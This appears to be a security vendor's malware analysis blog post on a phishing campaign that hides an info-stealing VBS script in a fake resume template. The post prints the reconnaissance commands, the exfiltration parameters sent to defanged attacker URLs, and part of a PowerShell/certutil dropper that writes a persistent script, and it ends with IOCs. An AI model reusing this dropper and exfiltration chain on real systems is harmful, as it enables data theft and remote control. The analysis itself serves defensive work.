@@ -1,0 +1,43 @@
+<div>
+Posted on <a href="https://asec.ahnlab.com/en/33322/" rel="bookmark" title="9:11 am">April 1, 2022</a>
+<h1 class="title">APT Attack Disguised as Resume Template for North Korean Defectors (VBS Script)</h1>
+<p>The ASEC analysis team has recently discovered that a malicious info-leaking VBS is being distributed via phishing email disguised as North Korea-related material. The email is about casting calls for a North Korea-related broadcast, and a compressed file is attached to it. It asks the readers to fill out the resume, prompting them to run the file. The compressed file contains a malicious VBS script file.</p>
+<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image jetpack-lazy-image--handled" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/eml%EC%88%98%EC%A0%95-1.png?resize=1024%2C679&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/eml%EC%88%98%EC%A0%95-1.png?resize=1024%2C679&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 1. Distributed email</figcaption></figure>
+<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image jetpack-lazy-image--handled" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/zip.png?resize=1024%2C514&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/zip.png?resize=1024%2C514&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 2. Attached compressed file</figcaption></figure>
+<p>The activities of ‘2022 Resume Template.vbs’ are as follows:</p>
+<ul><li>Collects and sends information</li><li>Creates a normal HWP file</li><li>Creates additional malicious script files and registers to task scheduler</li></ul>
+<p>When the VBS file is run, it collects user PC information using the commands below.</p>
+<figure class="wp-block-table"><table><thead><tr><td>Collected Information</td><td>Command</td></tr></thead><tbody><tr><td>List of currently running processes</td><td>cmd /c tasklist /v | clip</td></tr><tr><td>Routing table information</td><td>cmd /c Route print | clip</td></tr><tr><td>Program Files folder information</td><td>cmd /c dir /w “”%SystemRoot%/../Program Files”” | clip</td></tr><tr><td>Program Files (x86) folder information</td><td>cmd /c dir /w “”%SystemRoot%/../Program Files (x86)”” | clip</td></tr></tbody></table><figcaption>Table 1. Collected Information</figcaption></figure>
+<p>It then encodes the collected information with Base64 and sends it to hxxp://fserverone.webcindario[.]com/contri/sqlite/msgbugPlog.php.</p>
+<ul><li>Parameter value: Cache=error&amp;Sand=[Username]&amp;Data=[Collected information encoded with base64]&amp;Em=[Username encoded with base64]</li></ul>
+<p>It also uses ‘2022.hwp’ command to run the HWP file created in the folder where ‘2022 Resume Template.vbs’ file was run to disguise it as a normal file. The HWP file contains a resume template as shown below.</p>
+<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/%EC%9D%B4%EB%A0%A5%EC%84%9C-%EC%88%98%EC%A0%95-1.png?w=758&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/%EC%9D%B4%EB%A0%A5%EC%84%9C-%EC%88%98%EC%A0%95-1.png?w=758&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 3. Inside HWP file</figcaption></figure>
+<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/hwp%EC%86%8D%EC%84%B1.png?w=522&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/hwp%EC%86%8D%EC%84%B1.png?w=522&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 4. Properties of HWP file</figcaption></figure>
+<p>It then uses powershell to run the data existing in the response received from the URL the information was sent to. It also registers %appdata%\mscornet.vbs file that was created from the response to task scheduler as Google Update Source Link. Furthermore, it copies mscornet.vbs to the Startup folder so that the VBS file can be run automatically, then self-deletes ‘2022 Resume Template.vbs.’</p>
+<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/sche.png?resize=1024%2C536&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/sche.png?resize=1024%2C536&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 5. Created task scheduler</figcaption></figure>
+<p>Although no special responses can currently be received from hxxp://fserverone.webcindario[.]com/contri/sqlite/msgbugPlog.php (the destination of sent information), additional commands exist in the received response recorded in AhnLab’s automatic analysis system RAPIT (Confirmed on March 26th).</p>
+<p>In the response message, it uses powershell to save the data encoded with base64 in %AppData%\~KB3241.tmp. It then decodes ~Kb3241.tmp to save it as %AppData%\mscornet.vbs and deletes ~KB3241.tmp.</p>
+<code class="language-js">powershell -w hidden ECHO OFF echo RnVuY3Rpb24gaDJzKGgpDQogIERpbSBhIDogYSA9IFNwbGl0KGgpDQogIERpbSBp &gt; "%AppData%\~KB3241.tmp" 
+echo DQogIEZvciBpID0gMCBUbyBVQm91bmQoYSkNCiAgICAgIGEoaSkgPSBDaHIoIiYi &gt;&gt; "%AppData%\~KB3241.tmp" 
+&lt;omitted&gt;
+echo ZSINCmtpbGxQcm9jZXNzICJpZWxvd3V0aWwuZXhlIg== &gt;&gt; "%AppData%\~KB3241.tmp" 
+certutil -f -decode "%AppData%\~KB3241.tmp" "%AppData%\mscornet.vbs" 
+del "%AppData%\~KB3241.tmp"</code>
+<p>mscornet.vbs accesses hxxp://cmaildowninvoice.webcindario[.]com/contri/sqlite/msgbugGlog.php?Cache=fail&amp;Sand=[PC name] and runs the received response with Execute command. No additional commands can be seen from the URL, but it can be made to perform various malicious behaviors by the attacker.</p>
+<p>Users must remain vigilant as malware disguised with North Korea-related materials are recently being distributed via Word files as well as in the form of VBS script.</p>
+<p>AhnLab’s anti-malware software, V3, is currently detecting and blocking the files using the following aliases.</p>
+<p>[File Detection]
+Dropper/VBS.Generic
+Trojan/VBS.Agent</p>
+<p>[IOC]
+ab97956fec732676ecfcedf55efadcbc
+e49e41a810730f4bf3d43178e4c84ee5
+hxxp://fserverone.webcindario[.]com/contri/sqlite/msgbugPlog.php
+hxxp://cmaildowninvoice.webcindario[.]com/contri/sqlite/ msgbugGlog.php</p>
+<p>Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and detailed analysis information.</p>
+<figure class="aligncenter size-large"><a href="https://atip.ahnlab.com/main"><img alt="" class="jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2021/07/ASEC_Blog_bn_800x300.png?w=800&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2021/07/ASEC_Blog_bn_800x300.png?w=800&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/></a></figure>
+<p><a href="https://atip.ahnlab.com/main" rel="noreferrer noopener" target="_blank"></a></p>
+<p>
+Categories:<a href="https://asec.ahnlab.com/en/category/malware-information/" rel="category tag">Malware Information</a> </p>
+<p>Tagged as:<a href="https://asec.ahnlab.com/en/tag/vbscript-en/" rel="tag">VBScript</a></p>
+</div>
